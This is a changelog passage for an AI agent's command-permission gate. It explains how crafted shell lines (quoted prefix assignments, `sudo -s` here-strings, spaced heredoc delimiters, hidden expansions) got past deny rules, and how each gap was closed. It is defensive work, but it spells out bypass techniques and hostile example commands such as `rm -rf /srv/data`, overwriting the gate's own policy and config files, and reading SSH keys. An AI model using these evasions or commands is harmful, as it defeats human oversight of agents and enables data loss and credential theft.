  dropped too: the opaque floor fired only on `indirection`. So `git push origin feature && X='a b' rm -rf
  /srv/data` logged, also under `deny: [delete]`, and `gh pr comment 5 ... && X='a b' gh pr comment 6 ... --body
  'Zork leaked'` walked past the posting rules. A word is now an assignment when its `NAME=` is unquoted in the
  source (only the value may be quoted, so `'X=a' cmd` still runs a program named `X=a`). The old reading is kept
  beside the command's, also before an `env -S` or `--split-string`, so `X='a b' ls` still asks, a store path in the
  value is still a store write and an env-inject value (`GIT_SSH_COMMAND='rm -rf /srv/data' env -S 'git fetch'`) is
  still read, and a setter under either reading (`X="$Y" ls`) still counts for a `command` rule (#394). The line is
  also decided with the part main put on top, and the whole call is also read and decided as before, each quoted
  word the program, the stricter outcome standing: a `cd` behind one (`X='a b' cd /dev && yarn publish`), a
  `coproc` after one or a value `declare` reads again leaves no decision lower than before. The two readings merge
  as a gh line's readings do (#399): each reserved part and violation of either stays, a violation as often as one
  of them lists it (two posts to one PR that both miss the footer around `X='a b' cd ~/.exo/state` list it twice),
  and the exo-gate hook's checks past the decision (body files, who may answer, "once", the required executor, an
  "always" bound to the exact line) read the line as before too. That reading is one of the line's readings
  (`gate.readings`), so a store write or secret part only it has keeps the answer with the principal, once (#447,
  #311), and a sudo write only it reads keeps its displaced part's approvers (#454). The hook's grant check (D-075)
  reads it against its own act too: a reserved hit there that is not that reading's act keeps the ask from an
  "always", as on main, so `X='a b' sudo git commit -m x; sudo git commit -m x` under `reserved: [local_write]`
  asks every time, although the commit leads the line now.
  An unknown program now asks beside a more severe part that logs (`git push origin feature && mytool --wipe`,
  `git push origin feature; kill -9 1`), unless a category line names `opaque_exec` below ask, and an "always" on
  such a line covers that exact line only. A script that calls a local tool the gate does not know after a push or
  a post now asks where it logged. An unknown program that names a store path (`bat ~/.exo/plugins/foo/__init__.py`)
  still asks the principal alone, and its decision now names the rule `opaque` where it named `floor`. Main's
  `scripts/gate_diff.py` lowers nothing on its built-in corpus or on aimed lines behind a quoted assignment (runs and
  counts in #546). With #584 and D-074, the line read as before also gets its own joined reading and its own reading
  as before D-074, and a store name an expansion hides or quotes (#320, `~/.exo/pol$(:)icies/gates.yaml`,
  `~/.exo/con$(:)fig.json`) behind a quoted prefix is a store write on every reading. With #514 and #493, the store
  scan keeps each store path either reading meets, so a target entry on a later one still matches, and an ssh host
  behind a quoted prefix is a target of the line (`X='a b' ssh buildhost gh pr view 5` under a rule on `buildhost`).
  With #634 (#591), the text of `env -S` is read as env's argv beside the quoted prefix readings, so `X='a b' env
  -S "'Y=c d' rm -rf /srv/data"` is a delete that `deny: [delete]` denies, where main asks as an unknown program;
  with main f28934a3 (#707, #491), the reading behind a quoted prefix reads the `env -S` text in every spelling
  env takes (`env -iS`, `--split-s=`, `-i0vS`, `--split`, also with `--` or a glued `;x` in the text) and a `sudo
  -s` or `sudo -i` shell's stdin, so `X='a b' env --split-s="'Y=c d' rm -rf /srv/data"` and `X='a b' sudo -s <<<
  'rm -rf /srv/data'` are deletes that `deny: [delete]` denies, where main f28934a3 asks as an unknown program; each
  such line decides at least as it does with `X=ab` and as main reads it. The line read as before #471 is main's
  whole reading, its `env -S` split readings included, and permissions bypass asks at the floor first only for
  that reading, so a post main holds beside a quoted prefix is still held, while a secret or store write only the
  new reading finds (`X='a b' env -S "gh auth token"`) asks at the floor where main's bypass allows it. With main
  58503282 (#635, #652, #659), a store name split by quotes, a backslash or a backslash-newline, or in another
  letter case, behind a quoted prefix is a store write on every reading, and so is a write by a relative name after
  a `cd` into such a folder there: `X='a b' cd ~/.E''XO && cp /tmp/x config.json` is a store write that
  `deny: [store_write]` denies, where main read it as `credentials` and asked. A camelCase tool the gate reads by
  its name and arguments keeps its floor (#515) and gets no reading as before. A line with a quoted prefix
  assignment is read again as before #471, with each of main's readings (on main f28934a3: 5 call readings where
  main makes 2 for `X='a b' cp /tmp/x ~/.exo/config.json`, 7 where main makes 3 for `X='a b' env -S 'rm -rf
  /srv/data'`); a line without one costs what it did.
- Gate (#491, D-038 amendment): `sudo -s`, `sudo -i`, `sudo --shell`, `sudo --login` and `doas -s` with no command
  start the target user's shell, which runs its stdin, but the gate read the line as `read` and allowed it, even under
  `deny: [delete]`: `echo 'rm -rf /srv/data' | sudo -s`, `sudo -i <<< 'rm -rf /srv/data'`, and
  `sudo -s <<< 'cp /tmp/x ~/.exo/policies/x'`, a store write with no ask. The gate now reads such a shell as it reads
  `bash` with no operand: an `opaque_exec` part that runs its stdin, and the commands of each text the line feeds it
  (a pipe, a here-string, a heredoc), so those lines are `delete` or `store_write` and a deny on them denies. A stdin
  the gate cannot read (`sudo -s < /tmp/script.sh`, a variable) asks, and so does a bare `sudo -s`, as `bash` alone
  does. sudo's options are read as getopt reads them (`-Es`, `-iu root`, `--user=root`, `--user root`, `--`), behind
  `env`, `nice`, `timeout`, `command` or another sudo too. A word the gate cannot read that may come to `-s` counts as
  a shell option: an option word with an expansion or an unquoted glob (`sudo -"$X"`, `sudo -?`; not `sudo -u"$U"`,
  whose expansion is the value), an option's value that may split into several words (`sudo -u $U`, a bracket glob
  such as `sudo -u [!a]s`, and a brace set, expanded with a word it makes twice kept: `sudo -u {root,-s}` is
  `sudo -u root -s`, `sudo -p {-s,-s}` is `sudo -p -s -s`), and an operand that may expand to an option (`sudo "$X"`,
  `sudo ?s`, `sudo ~-`); when the line feeds such a command a stdin, it is read as the shell's too, since the word may
  take the next one as its value (`sudo -$X root` may be `sudo -iu root`). The options are then also read from the
  word after the next one, and a brace value that ends them elsewhere has its command read as sudo runs it, so
  `sudo -u {root,-p} echo rm -rf /srv/data` (prompt `echo`, then `rm`; allowed before, on main too) is `delete`, and
  so is `sudo -E{,p} echo sudo -E{,p} echo rm -rf /srv/data`, whose moved words are read as bash expanded them too;
  such readings add only what their command is known to do (`sudo -u $U cat /etc/hosts` stays a read), and a nest of
  them past the depth cap asks. `sudo -u $U` alone, `sudo -u $U -l` and `sudo -u $U -v` now ask. A long chain of sudos
  is read in linear time. With a command, sudo runs `$SHELL -c` on its words joined with the shell's metacharacters
  escaped, and that text is read too where it may differ from the words (a `$`, a newline, an empty word, an option
  the prefix reader misread: `sudo -iu root rm -rf /srv/data` is `delete`), and such a line still asks as code the
  gate cannot fully see, as it did as an unknown program; a word the gate cannot read asks. A later sudo's brace value,
  which that text holds as a literal, is read as bash expanded it (`sudo -s sudo -u "$U" -u {root,-p} echo rm -rf
  /srv/data` is `delete`). The line's own parts stay beside the new ones, and the call is also read as before
  (`gate.readings`) and decided on each reading, so no decision is lower than before.
  `su` and `sudo su` with a stdin still ask as an unknown program without reading the text.
- Gate (#328, D-038): a quoted heredoc delimiter with a space hid the commands after the heredoc. The lexer ended a
  body at the first line that equalled the delimiter once its surrounding whitespace was stripped, so a delimiter such
  as `<<'EOF '`, `<<"EOF "`, `<<' EOF'` or `<<EOF\ ` never matched and every later line, the real terminator included,
  was read as body: `cat <<'EOF ' ... EOF ` then `git push --force`, `rm -rf build` or `gh pr merge` ran under the
  default policy as an allowed `cat`. The lexer now ends the body on the line that equals the delimiter exactly, as
  bash does (the delimiter is the opener word after quote removal, for every quoting form; leading tabs dropped on the
  terminator only for `<<-`), so the commands after it are classified and denied. When no line ends the body it fails
  closed and reads the body as commands. Whitespace-near lines mark the body ambiguous without ending it early;
  carriage returns in delimiter words are retained, and `EOF)` ends a body only inside a substitution. Named
  descriptors retain hidden-variable assignment checks. A `{var}<<` heredoc or `{var}<<<` here-string (bash 4.1+ puts it on a new
  descriptor, not stdin) is no longer read as a command's stdin, as a numbered `3<<` already was (#306): a post whose
  real body comes from a pipe is not mistaken for the heredoc, and its body stays unseen. (Known limit kept: a `~`
  after `=` in a word such as `body=~/F` is not yet treated as an expansion, so the home-path scrub reads it literally.)
- Gate (#584, D-038 amendment): a backslash-newline right after a `$` no longer hides a command substitution, a
  parameter expansion or a `$@` split. Bash drops each `\<newline>` outside single quotes before it reads a word,
  so `echo "$\<newline>(git push --force origin main)"` runs the push, but the gate read the `$` as text and
  allowed the line under `deny: [force_push]`; `echo "$\<newline>(curl -X POST ...)"` was an allowed read too, and
  `echo "${PA\<newline>TH:=/tmp}"; ls` hid a PATH change. A shell line is now also read with each `\<newline>`
  dropped after a `$`, in a `${..}`, between `$(` and the `(` of `$((` and in a `$((..))`, on the line and on each
  line read again from it once decoded (`bash -c $'..'`, `eval "..."`, ssh, backquotes), and also as written, as
  before. `decide` keeps the stricter (`gate.readings`), the more severe reading leads the approval card, and an
  approval for such a line binds to its exact text. A line the join leaves as it is is read once, as before.
- Gate (#515, D-038 amendment): The name parser adds camelCase words beside each separator part. The complete unsplit call is also
  read as a policy floor: its secret and store checks, target, posting text and category rules still apply.
  This prevents a new read hint from bypassing a store-source ask, an outbound hint from bypassing a
  credential ask, and a draft hint from weakening an existing send reading. A policy that asks or denies
  `unknown` still applies to a camelCase call previously read as unknown. `deleteFile` on `~/.exo`
  now asks through its new store-write reading; `readFile` on a store file still asks through the old
  store-source reading. Compact names such as `apiKey`, `checkOut` and `signUp` retain their old
  reading. Empty separator parts are dropped, preserving the MCP remote-write flag for leading separators.
  Earlier built-in differential counts covered the pre-review implementation only and do not validate
  these additional regressions. Regression tests cover secret/store floors, outbound metadata and posting
  rules, explicit unknown-category policies, and leading-separator MCP names.
- Gate store protection (#125, D-074): `$EXO_HOME/config.json` is a store path. It names the plugins the core loads
  (this gate among them), their config, the `venv` that runs Exo, each provider's `base_url` and headers, and, since
  #525, the principal a peer key with no seat file speaks for. A tool could rewrite it with no ask, even under
  `deny: [store_write]`: `cp /tmp/evil ~/.exo/config.json`, `mv`, `install`, `tee` and `ln -sf` were an allowed
  `shell`, a redirection an allowed `local_write`, and `write_file`, `edit_file` or `apply_patch` there an allowed
  `local_write`. A write in any form the store checks read (`~`, `$HOME`, `$EXO_HOME` or a full path, a brace set, a
  relative `.exo/config.json` also spelt `.exo/./config.json`, after a `cd` into the home, under `sudo`, `env`,
  `bash -c` or `ssh`, the file tools' path keys) is now `store_write`: it always asks, only the principal answers, no
  grant covers it, and `deny: [store_write]` denies it. A tool call that runs `exo config set` or `unset`,
  `exo import-store` or `exo interview` (also through `python -m exo.config`) is `store_write` too and keeps its
  `opaque_exec` reading as a part, as `exo update --pin-trust` does, so `deny: [opaque_exec]` still denies it.
  `exo providers default` stays `credentials` with the store write as a part, so a deny on either denies it.
  Reads stay `read`, and a project's `config.json` is unchanged. No decision is lower than on main: a call in which
  `config.json` counted is also read as before (`Classification.ordinary`, one of `gate.readings`), and the stricter
  decision stands, so `matrix_deny_cells` still denies
  `ssh -o RemoteCommand='rm -rf /srv/data; cp /tmp/x ~/.exo/config.json' h` and `deny: [credentials]` still denies
  `cat ~/.ssh/id_rsa; cp /tmp/x ~/.exo/config.json`. A quoted or split name (`~/.exo/con'fig'.json`) and a symlink
  to the file (made earlier, or by an `ln` on the same line) count too; the name is matched case-sensitively, as the
  other store names are. A copy or extraction into a folder that holds the file is #483.
- Gate (#225, #269, #309, #341, D-038): store names an expansion hides, and relative names that reach the run
  folder, now ask. #307 read an expansion inside a secret-store name as empty and, between literal text, as `*`.
  That reading now also takes a substitution at the end of a word as `*` (`cat ~/.config/gh/$(printf hosts.yml)`,
  `cd ~/.kube && cat $(ls)`), `$(( ))` and `$[ ]` as substitutions (`cat id_ed$((25519))`, `cat id_ed$[25519]`),
  one that starts a name as `.*` (`cat $(printf .e)nv`), and the default word of an unknown variable as its value
  (`cat ${x-.env}`, `cat ${x:-~/.kube}/config`, `cat ${x[0]:-.env}`, `cat ${x:-$HOME/.exo}/keys/seat`). These were
  allowed reads. The same reading reaches working-folder targets (`cd ~/.k$(:)ube && cat config`,
  `tar -C ~/.k$(:)ube -czf - .`, `cd ~/.k${u}ube && cat config`) and the Exo-store write checks (#309), so
  `cp x ~/.exo/polic$(:)ies/gates.yaml`, `mv x ~/.exo/polic${u}ies/gates.yaml`,
  `tee ~/.exo/polic$(:)ies/gates.yaml < x`, `cp x ~/.exo/$(printf policies)/default.yaml`,
  `cp x ${x:-$HOME/.exo}/policies/a`, `cp x ~/.exo/bu$(printf s)/x` and `cp x ~/x/update/allowed_$(printf s)igners`
  are `store_write`. They were allowed `shell` writes. #305's resolution of names from a folder in `$EXO_HOME` now
  reads a target spelt with a glob or an expansion, in the store's own folder or below it
  (`cd ~/.e*o/run/jobs && grep -r x ..`, `cd ~/.exo/r?n/jobs && grep -r x ..`, `cd ~/.exo/r$(printf u)n/jobs && ls
  ..`, `cd ~/.exo && cd r$(:)un/jobs`, `cd ~/.exo/principals/m?/run/jobs && ls ..`), a part that could be `..`
  (`cd .? && grep -r .`, `cd .?/.. && grep -r x .`, `cd $PWD/.?/.. && grep -r x .`, `grep -r . .$(:).`,
  `grep -r . ./.?`, `grep -r . .//.?`, `grep -r . .?/..`), a glob that could be the run folder (`tar -C ~/.exo -czf -
  ru?`), and a folder that holds a run folder (`cd ~/.exo/run/jobs && grep -r x ../..`, `cd ~/.exo && grep -r x
  principals/me`, `tar -C ~/.exo/principals/me -czf - .`). Each spelling is read once per tool call, so the work stays
  linear. A matrix cell or a `target:/dev*` entry that denied such a line on main still denies it (#464): the `*`
  reading makes some lines `store_write`, and the line's other parts keep their own cells and targets. A rule that
  denies a costly `read`, `shell` or `local_write` part still denies such a line run over ssh by `sudo` or `doas`, or
  by a privileged wrapper over ssh or through a shell: a costly copy of each reversible part the wrapper runs, nested
  ones too, is added beside it (`sudo ssh host 'cat ${x}rc'` and `doas ssh host 'cp x ~/.exo/polic$(date)ies/a'` under
  gate_diff's `rule_costly_part_deny`), and so does the unsplit line (`sudo ssh host 'cat ~/.kube/config'`), which
  asked on main. The parts stay as written, so a rule or entry keyed on `reversibility` reaches them as on main
  (`sudo ssh host 'ls; cat x'` still denies under a rule that denies a reversible `read`, and under `read: deny`
  lifted by a rule that allows a costly `read`). gate_diff against main edeb4f89, under its 87 built-in policies, 57
  policies keyed on `reversibility` (rules, lifted category lines, matrix rows, deny and reserved entries) and 38
  keyed on targets (`*keys*`, `*run*`, `*plugins*` and other store names as rules, deny and reserved entries, and
  #468's four), lowers no pair (outcome, reserved hit or posting violation). Each form reaches the plugins folder
  (#435) as it reaches `policies/` (`cp x ~/.exo/plug$(:)ins/foo/__init__.py`, `cd ~/.e$(:)xo && cp x
  plugins/foo/x.py`). Words that cannot spell a store name keep their class (`cat notes$(date +%F).txt`, `cat $f`,
  `cat ${OUT:-/tmp/out}/report.txt`, `cp x out/$(date +%F).json`), and so does a write whose file name only its folder
  ties to the store
  (`cp x state/$(date +%F).json`, `cp x src/state/$(basename $f)`, `sed -i s/a/b/ src/state/$(git ls-files | head
  -1)`). A line is read first with its words as written, as main reads it, and that name decides the line and builds
  its parts as on main, #468's key read beside a store write among them; these forms and readings come after it, and a
  name they find that is another target is a `credentials` part beside it. So under a rule on `target: '*keys*'`,
  `cd ~/.exo/state && echo $(cat ../keys/seat; rm -rf x)`, `cd ~/.exo && cat $(ls) keys/seat` and
  `cd ~/.exo/state && cat ${x-.env} ../keys/seat` deny as on main edeb4f89, and under one on `*run*` so does
  `cd ~/.exo/state && grep -r x .. ../run`. A shell call's own folder argument (#311) is read in the same order,
  so `echo $(cat config)` with `~/.kube` as `cwd` keeps its part on `~/.kube/config`, with one on `~/.kube/*`
  beside it, and a rule or `target:` entry on `*config*` still denies it. The folder's read is a part beside a line
  that reads a secret itself when it names another target, as beside the `cd` form: `cat id_rsa` with `~/.ssh` as
  `cwd` is denied by `deny: [target:*/.ssh]` as `cd ~/.ssh && cat id_rsa` is (main asks), and a line these forms
  make a secret line keeps the folder's part (`cat ${x-.netrc}; echo $(git push --force origin main)` with
  `~/.exo/keys` as `cwd` under `deny: [target:*/.exo/*]`), with a copy of the push that has no own text, so an
  allow rule on `command` does not lift a `force_push: deny` there, as on main. The copy keeps its body, so
  `cat ${x-.env} config; gh pr comment 3 --body hi` with `~/.exo/keys` as `cwd` lists its footer violation twice, as
  main does (once as the line's own, once named after the post), each named after the post here. The copy is the
  line's first part, so on a line of more than 20 posts its entry is listed before the card's cap, as main lists the
  line's own, and its entries take none of the cap's 20 places, so posts with no numbered target
  (`gh pr comment --body hi`, `gh issue create`) list at least as many entries as on main too. A here-doc body on
  the line reaches the most severe post below a secret read, as it reaches one below
  a store write (#435), so `cat ${x-.netrc}; mail -s s a@b.c <<EOF` keeps the mail's footer, forbidden-word and scrub
  checks, as on main, where the mail decides the line; `cat .netrc; mail -s s a@b.c <<EOF` now has them too, which
  main skips.
  This fails closed on a few lines. A word that is a substitution alone after a `cd` into a store folder asks
  (`cd ~/.kube && echo $(date)`, `kubectl get pods -n $(cat ns.txt)`, `cd ~/.exo/policies && echo $(ls)`), and so
  does one in a shell call whose own folder argument is a store folder (`echo x $(cat f) w` with `~/.kube` as
  `cwd`, an allowed read on main), also one
  before the `cd` or a value set by one, as main reads `echo *; cd ~/.exo/policies`
  (`echo $(cp /tmp/evil gates.yaml); cd ~/.exo/policies`, `V=$(sed -n 1p VERSION); cd ~/.exo && ls`): these are
  `credentials` where #468 reads them as `read`, and no command in the substitution is a store write. These ask
  too: `cd ~/.exo && ls principals`, in `run/jobs` `ls ../..`, `cat $(ls)` and `tail -f $(ls -t | head -1)`, a
  variable that starts a name (`cat ${x}rc`, read as `.*rc`), a read of a folder that holds a store by a name made
  by output (`cat /tmp/$(cat last)`,
  `ls /tmp/$(whoami)`, `ls ~/.config/$(whoami)`, `cat ~/.config/$(ls ~/.config | head -1)`, as `cat /tmp/*` asks),
  and `cat ${x:-'~/.kube'}/config`. A name whose own text fits a store file, split by output, is `store_write`
  (`cp x data/schedule$(date +%F).sqlite`, `cp x out/seat$(date +%F).json`), and so is a split spelling bash never
  makes a store path (`cp x ~/.exo/polic$(date)ies/a`). A write to `keys/` only the `*` reading reaches
  (`cp x ~/.exo/$(printf keys)/a`) is `store_write`, not `credentials`. Both ask. A key read from a split `tar -C`
  store folder (`tar -C ~/.exo/poli$(:)cies -czf - ../keys/seat`, `credentials` on main) is now `store_write` with a
  `credentials` part, so a policy that denies `credentials` still denies it. A long write line full of expansions
  costs 2 to 3 times the CPU time it did (2,000 `cp` words with a `$(:)` in each: about 2.4 times), and the work
  stays linear. Not covered: a name left with fewer than three characters of its own
  (`cat .$(printf env)`), a pattern-matched name split by output (`cat server.k$(printf e)y`), output with a `/` in
  it (`cp x ~/$(printf .exo/policies)/x`), an expansion that ends a store write's word (`cp x ~/.exo/$name`), a store
  file's name made whole by output (`cp x state/$(printf approval-grants).json`), a literal glob in a store write
  (`cp x ~/.exo/polic?es/gates.yaml`), a default word with a `}` in it (`${x:-${HOME}/.kube}`), behind an indirect
  name (`${!x:-~/.kube}`, `${!x[0]:-.env}`) or a subscript with an expansion in braces (`${x[${i}]:-$HOME/.exo}`),
  a part that could be `..` after a literal part (`grep -r x ~/.exo/run/jobs/.?`), and a folder by its full path
  (`tar czf - ${x:-$HOME/.kube}`, as `tar czf - ~/.kube`, and `grep -r x ~/.exo/principals/me`). A line these forms
  make a secret line beside a store write is `credentials`, as a literal secret makes it on main
  (`cd ~/.exo/state && cat ${x-.netrc}; echo $(rm -rf x)`), and its store write part keeps the answer with the
  principal alone (#447). Any line these forms make `credentials` is answered by those who may answer
  `credentials`, as the literal line is on main (`cat ${x-.netrc}; echo $(git push --force origin main)`, a force
  push on main). Nested defaults and the field-split form `cat ${x:-a .env}` stay reads, on main
  edeb4f89 as here (#341).
- Gate (#447, D-038 amendment): a store write keeps the answer with the principal when a secret read leads the
  line. A secret read outranks a store write, so `env; echo x > ~/.exo/policies/gates.yaml` and
  `cat ~/.kube/config; cp evil.yaml ~/.exo/policies/default.yaml` were `credentials`, and a seat that
  `approvals.yaml` lets answer `credentials` could approve a write to the policy files. The hook now reads the
  line's `credentials` and `store_write` parts. The ask goes to those allowed for its category and for each such
  part (`gate.call_approvers`), and no standing grant covers a line with such a part, in any mode
  (`gate.no_grant`). So a store write anywhere on the line is the principal's alone, also behind `sudo sh -c`,
  `bash -c`, `timeout` or `env`, in a subshell, a `$( )` or a heredoc. Other parts do not narrow the approvers
  yet (#437). The line's category and outcome do not change. A secret read alone keeps its delegation. A shell
  write, delete, copy or archive in `keys/` or the run folder (#169) that the gate reads as a write is the
  principal's alone now for the same reason. Some copy spellings read only as a key read and keep the delegation
  (`docs/GATE.md` "Known limits"). A file tool that names a secret and a store file is `credentials` too
  (`apply_patch` on `~/.ssh/config` and `~/.exo/policies/gates.yaml`, `move_file` from `~/.ssh/id_rsa` to
  `~/.exo/policies/gates.yaml`, `write_file` or `delete_file` in `keys/`). Each store file it writes, moves,
  copies or deletes is now a `store_write` part, and so is a folder holding the store that it moves, renames or
  deletes, also under a camelCase name (`moveFile`). So it is the principal's alone as well, and a `store_write`
  deny or `reserved:` entry, or a `target:` entry on any of those files, reaches it. The hook's error fallback
  reads the parts too. On a gh line the gate also reads as before #399 (`floor`), the parts of both readings count
  (`gate.readings`), and a file tool's store write part reaches the plugins folder too (#435).
- Gate (#454, D-038 amendment): a write redirection on a `sudo` or `doas` command sets the line's category, as on any
  other command. `sudo echo hi > /tmp/f` was a `read`: sudo made the command's own `read` costly, so it outranked the
  write, and `categories: {local_write: ask}` allowed the line while `echo hi > /tmp/f` asked. Bash opens the file as
  the calling user before sudo runs, so the write happens either way. Where that `read` would lead the line, the first
  sudo write now leads in its place, with its cost. The line is a costly `local_write` with the written path as
  target, so an ask or log line, a rule or an escalation on `local_write` or on that path reaches it. Its summary
  names the program and the path, the two apart when the write is on another command (`gh pr view; write /tmp/f`).
  The line is also decided with the displaced `read` leading, as before, and the stricter outcome stands, so
  `{read: ask}` and a rule on a gh read's repo or on the host of an `ssh` hop still reach it. `ssh -o RemoteCommand=`
  gives its host to neither part, so a rule that asks or logs on the host does not reach that form, as before #454
  (#493). A deny on the host still reaches it through ssh's own part. A part that outranks the `read`, such as an
  unknown program or ssh running its stdin, still leads, also beside a sudo write in a `$( )` or an ssh hop
  (`echo $(sudo echo hi > /tmp/f) $(foo)` asks), and a store path stays `store_write`. This also ends the #436
  lowering of `for x do sudo echo hi > /tmp/f; done`. An `ssh -o RemoteCommand=` raises the displaced part with the
  copy, so `sudo ls; ssh -o RemoteCommand='sudo gh pr view 9 -R a/b > /tmp/f' h` still asks under a rule on `a/b`.
  Where only the write asks, a standing grant and the approvers follow the new category and target. Where the
  displaced part names a repo or a host, or the line asks with that part leading, the approval is bound to the exact
  command, and only those who may answer both categories may answer it, so a grant or a seat for the written path does
  not answer a rule on that repo or host, or an ask on that part's category. A reserved hit on the write keeps the
  principal's ask from a grant, as before. The displaced part keeps #399's other targets, and the line as #399 read it
  before keeps that reading's approvers.
- Gate (#435, D-038 amendment): a write into `$EXO_HOME/plugins` asks the principal. The core loads each plugin it
  finds there and runs its code with the harness's rights, so a write there installs or changes code the next session
  runs. Most writes there were allowed: only a `cd` or `git -C` into the Exo home made one a store write, and a delete
  asked as a plain `delete`. `cp evil.py ~/.exo/plugins/foo/__init__.py` was an allowed `shell`, and `write_file` on
  the same path an allowed `local_write`. The folder is now a protected store folder, and `.exo/plugins` a name that
  counts anywhere. A write there is `store_write` (the principal alone, no grant) when made by a file tool, a
  redirection, `cp`, `cp -t`, `mv`, `install`, `tee`, `sed -i`, `ln`, `rsync`, `tar -C`, `unzip -d`, `curl -o`,
  `git clone` or `pip install --target` into it, or `mkdir`, `chmod` or `rm` there, spelt with `~`, `$HOME`,
  `$EXO_HOME`, the resolved path or a link into it. A read with a read command (`cat`, `ls`, `grep -r`, `find`, a read
  tool) stays a read. A writing command that names a file there only as a source asks too, as for the rest of the
  store, and so do other commands that only read but are not read commands (`sed -n`, `tree`, `sort`, `xxd`). A call
  that sends a store file out (an `email_send`, post or payment tool call with the file in `files:`, an MCP upload
  tool, `curl -T`, `curl -F`, `mail -A`) keeps the call as a part, with its target and text. So a deny, reserved
  entry, rule, matrix deny cell or posting rule on that call still applies, as on main, and a here-doc body on the
  line still reaches the post, also inside `bash <<EOF`. For `policies/`, `state/` and `update/` the here-doc body is
  new: the gate gave it to no post, so `mail -A ~/.exo/policies/x a@b.c <<EOF` listed no violation for a home path in
  the body. A file tool there keeps its own reading as a part (#448), and a line in `/dev` keeps `/dev` as a target
  (#464), so a deny on `local_write`, `delete` or `target:/dev*` still applies. Not covered: the folders in
  `$EXO_PLUGIN_DIRS`, which developers point at a checkout, and, as for the rest of the store, a relative path written
  by a tool whose working folder is in the plugins folder.
- Gate (#399, D-033): a URL in a gh option's value no longer picks the post's repo. The first word after the
  subcommand that began with a GitHub URL was the target, a body or `--duplicate-of` value included, so
  `gh pr comment 5 -R pub/repo -b 'https://github.com/myorg/app/pull/9 ...'` counted as a post on `myorg/app#9`. Under
  `internal: [myorg/*]` it logged, and the scrub, the footer and the third-party check for the public repo never ran.
  A number in an option value (`-b 7`) became the target's number too. The target now comes from `-R` and the operands
  only, read with the table of options that take a value that the unseen check uses. gh keeps the last `-R`, and a URL
  operand still names the repo, as in gh. It reads as gh reads it, also with `www.`, a port, a user or a host in
  capitals (`https://www.github.com/pub/repo/pull/5`), and `gh repo` drops a repo URL's `.git`. A port past 65535
  counts, and the host reads decoded and lowered as gh reads it (`https://g%C4%B0thub.com/pub/repo/pull/5` is on
  github.com). A control character in a URL's fragment counts too, as gh reads it. A host that ends in
  `.github.com` names a repo on github.com too, since gh sends the request there
  (`https://api.github.com/pub/repo/pull/5`). The exception is garage.github.com, which gh calls at itself. A URL on
  another instance (`https://ghe.corp/pub/repo/pull/5`) is another target where gh reads a repo from it. The gate also
  decides the line on every other repo it cannot rule out (`-R` beside a URL operand for another repo, and the reading
  before this change) and keeps the strictest decision, so no line decides lower than before. Such a line binds its
  approval to the exact command, so a standing grant on one of its targets does not run it, and its question names
  every other target ("It may land on pub/repo#7 instead."). A user and password in such a URL read as `***@` there,
  in a reason that names a post or a denied part after it, and in the ledger's `alt_targets`. A line with such a post
  lists what its posts with copies and their copies find in a room of 200 of their own, beside the twenty of the
  other posts, so it lists all that main lists while those list no more than 200. Past that, a line can list fewer
  than main does, and it still asks. Its `and N more on other posts` counts each entry a reading of the line left
  out. `gh issue close --duplicate-of` and `-r` take a value in
  the gate's table now, and the table lists `gh pr ready`, `lock` and `unlock`, `gh issue develop`, `lock`, `unlock`,
  `delete` and `transfer`, and `gh release upload` and `delete`, beside the reopen and merge rows from #397. So
  `gh pr ready --undo <URL>` no longer asks about "the current repo". `gh api` took its endpoint from the first word
  with a `/`, an option's value too, so
  `gh api -H 'X-Note: repos/myorg/app/' repos/pub/repo/issues/5/comments -f body=...` was a post on `myorg/app`. Its
  endpoint is its one operand now, and the word it took before is another target. Its method reads as gh reads it, so
  `gh api -iX DELETE repos/pub/repo` and `gh api -X GET -X DELETE repos/pub/repo` are deletes, not reads. Where that
  differs from the first `-X` word as written, the line as read before is decided too. `-R` reads as gh reads it:
  `-R=pub/repo` and `-wR=pub/repo` name `pub/repo`, not `=pub/repo`, and `github.com/pub/repo` or a repo URL names
  `pub/repo`, so a `target:` deny on `pub/*` matches them. On another instance the value as written is another target.
  An operand from an expansion (`gh pr merge "$U" -R myorg/app`) may name any repo, so the line is also decided on a
  repo it does not name. On an ssh or mosh hop the host stands for an empty other target too, as for an empty target.
  It stands for that target's copy among the line's parts as well, so a rule, deny or reserved entry on the host's
  category sees it also when another part of the line outranks the gh call. The exo-gate hook reads a post's absolute
  body file into each reading too, so such a post with a clean body runs or offers "always" as before. A differential
  over 270,394 gh lines against main with #397 found none lower than before. The lines that classify differently were
  decided under 119 policies and run through the exo-gate hook with standing grants, in observe mode and with a
  required executor, and checked on who may answer and "once" too.
- Gate (#399, D-033): an option before a gh subcommand no longer hides it. gh finds the subcommand past the options
  before it, so `gh pr -R pub/repo comment 5 -b text` and `gh pr -b text comment 5 -R pub/repo` post. The gate took
  the third word for the subcommand, so these lines were reads and ran under any policy, as did
  `gh issue -R x/y close 5` and `gh pr -R x/y merge 5`. A public post with a scrub hit passed too. The gate now finds
  the subcommand as gh does. It passes over an empty word (`gh pr "" comment`, `gh "" pr comment`), and an alias reads
  as the subcommand it names, so `gh pr new`, `gh issue new`, `gh repo new`, `gh release new`, `gh gist new` and
  `gh variable remove` are no longer reads. A command alias (`gh co`), a user alias and an extension still ask. A word
  from an expansion where the subcommand may stand (`gh pr "$V" 5`) counts as code the gate cannot read. So does an
  option's value before the subcommand that bash may split (`gh pr -R $R view 5`, also
  `gh pr -R "$(: ")")"$R view 5`). `gh -R $R secret set X` and `gh --repo=$R secret set X` stay credentials.
  gh finds the command past the options
  before it too, so `gh -R pub/repo pr comment 5 -b x` is a post on `pub/repo#5`. The gate read that line as an alias
  or extension, and under `opaque_exec: allow` it ran with no posting checks. The line as read before is decided too,
  and the stricter decision stands, so no line decides lower than it did. A required executor refuses the line when
  either reading has a body file or an unseen body, so `gh pr "$V" 5 -F notes.md` is refused as before. Only who may
  answer both readings may answer the line, so a seat listed for `github_post` does not answer `gh pr -b x comment 5`,
  which only the principal answered as a read. A line either reading makes credentials, a store write or an unseen
  post is answered once, gets no standing grant and asks in observe mode.
- Gate store protection (#465, D-038 amendment): after `cd` into the store or a descriptor folder, a `$( )`,
  backticks or `<( )` of a later command is classified in that folder, as the same command unwrapped is. Each
  substitution was classified as a fresh line, so `cd ~/.exo/policies && echo $(cp /tmp/evil gates.yaml)`, the
  `x=$( )`, `cat <( )` and backtick forms, `cd ~/.exo/state && echo "$(cp /tmp/g.json approval-grants.json)"` and
  `cd /dev && echo $(cp /tmp/evil fd/3)` were allowed with no ask under the default policy, and could rewrite the
  gate's own policy or grant file, or whatever file a descriptor held. They now ask the principal alone. A
  command the gate does not read as a read (`sed`, `sort`, `curl`) asks there too, as it does unwrapped. A
